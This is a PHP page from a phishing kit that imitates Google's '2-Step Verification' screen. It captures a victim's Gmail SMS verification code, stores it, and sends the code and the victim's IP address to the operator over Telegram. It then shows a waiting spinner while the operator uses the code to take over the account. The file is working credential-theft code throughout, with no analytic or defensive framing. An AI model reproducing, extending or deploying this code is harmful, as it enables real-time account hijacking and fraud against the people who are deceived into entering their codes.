<?php
include "helper.php";

$token = $_GET['token'] ?? $_POST['token'] ?? '';
$waiting = isset($_GET['waiting']) && $_GET['waiting'] === '1';

if ($token === '') {
    header('Location: continue.php');
    exit;
}

$filePath = "status/" . $token . ".txt";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = trim($_POST['code'] ?? '');

    file_put_contents($filePath, 'gm_hold');

    if (!is_dir("gmail_session")) {
        mkdir("gmail_session", 0755, true);
    }
    file_put_contents("gmail_session/" . $token . "_2fa.txt", json_encode(['code' => $code]));

    $ip = getClientIp();
    $message = "GMAIL SMS CODE\nid: <code>" . $token . "</code>\n\n<code>" . htmlspecialchars($code) . "</code>\n\nip: <code>" . $ip . "</code>";
    $keyboard = getGmailNavKeyboard($token, true);
    sendTGWithButtons($message, $keyboard);
    $waiting = true;
} elseif (!$waiting) {
    header("Location: gmail_2fa.php?token=" . urlencode($token) . "&mode=pick");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>2-Step Verification - Google Accounts</title>
    <link href="gmail-files/common.css" rel="stylesheet">
    <link href="gmail-files/login.css" rel="stylesheet">
</head>
<body class="gm-login">
    <div class="gm-spinner-wrap">
        <div class="gm-spinner"></div>
    </div>
    <script src="gmail-files/status.js?v=3"></script>
    <script>gmCheckStatus(<?= json_encode($token); ?>, { holdStatuses: ['gm_hold', 'hold', 'continue', ''] });</script>
</body>
</html>
